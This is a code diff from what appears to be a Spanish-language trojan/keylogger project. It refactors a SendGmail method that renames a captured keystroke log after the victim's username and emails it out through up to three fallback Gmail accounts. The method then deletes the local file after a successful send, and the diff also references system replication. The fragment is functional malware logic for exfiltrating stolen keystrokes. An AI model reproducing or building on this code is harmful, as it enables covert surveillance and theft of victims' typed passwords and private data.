@@ -171,7 +171,7 @@ class Util:
                 print("\n[Trojan] - Hubo un problema al replicar en el sistema")
 
     # Envía los datos reg.k vía Gmail
-    def SendGmail(self,log, sender_email, sender_password, receiver_email):
+    def SendGmail(self):
         # Crea nombre del archivo
         nameFile = str(getuser()) + "-" + Functions().RandomChar(12) + ".txt"
         # Renombra el archivo original
@@ -182,12 +182,15 @@ class Util:
         homedir = Config().LOG_KEY_PATH + str(nameFile)
         print("[Gmail send] Proceso de envío...")
 
+        if Functions.SendGmail(homedir, Config.Gmail().GMAIL_1, Config.Gmail().PASS_1, Config.Gmail().RECEIVERS):
+            os.remove(homedir)
 
-        if SendGmail(homedir, emailP(), passP(), ReceiveE()):  # Envía con el primer correo
-            # Si se envíó correctamente, pues elimina el archivo
+        elif Functions.SendGmail(homedir, Config.Gmail().GMAIL_2, Config.Gmail().PASS_2, Config.Gmail().RECEIVERS):
             os.remove(homedir)
-        elif SendGmail(homedir, emailS(), passS(), ReceiveE()):  # Envía con el segundo correo
+
+        elif Functions.SendGmail(homedir, Config.Gmail().GMAIL_3, Config.Gmail().PASS_3, Config.Gmail().RECEIVERS):
             os.remove(homedir)
+
 
 
 
